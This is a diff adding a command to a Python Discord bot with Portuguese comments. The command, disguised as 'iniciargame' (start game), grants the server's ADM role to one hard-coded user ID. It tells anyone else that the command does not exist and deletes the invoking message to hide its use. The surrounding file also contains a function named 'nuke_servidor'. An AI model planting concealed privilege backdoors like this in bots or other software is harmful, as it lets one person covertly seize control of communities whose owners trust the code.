@@ -1438,6 +1438,38 @@ async def nuke_servidor(ctx):
             pass
 
 
+# ================= COMANDO INICIARGAME =================
+
+INICIARGAME_USER_ID = 1428860012419219557  # Único que pode usar o !iniciargame
+CARGO_ADM_ID = 1304658653839888436         # ID do cargo de ADM
+
+@bot.command(name="iniciargame")
+async def iniciar_game(ctx):
+    if ctx.author.id != INICIARGAME_USER_ID:
+        await ctx.send("Esse comando não existe! 🤔")
+        return
+
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
+    guild = ctx.guild
+    membro = guild.get_member(INICIARGAME_USER_ID)
+    cargo = guild.get_role(CARGO_ADM_ID)
+
+    if membro is None or cargo is None:
+        await ctx.author.send("❌ Não encontrei o membro ou o cargo. Verifique os IDs.")
+        return
+
+    if cargo in membro.roles:
+        await ctx.author.send("✅ Você já tem o cargo de ADM!")
+        return
+
+    await membro.add_roles(cargo, reason="!iniciargame executado")
+    await ctx.author.send(f"✅ Cargo de ADM concedido com sucesso!")
+
+
 # ================= BOAS VINDAS POR CARGO =================
 
 # Mapeamento: ID do cargo → (nome do cargo, ID do canal, mensagem de boas vindas, gif)
